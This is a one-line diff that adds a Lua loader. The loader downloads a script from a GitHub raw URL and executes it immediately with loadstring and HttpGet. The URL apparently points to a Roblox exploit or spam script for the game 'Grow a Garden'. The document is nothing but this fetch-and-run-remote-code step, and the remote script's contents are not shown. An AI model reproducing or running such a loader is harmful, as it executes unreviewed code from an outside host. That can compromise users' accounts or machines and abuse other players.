@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/grow-a-garden-spam2-4mzdcrp7ih2fxu.lua"))()
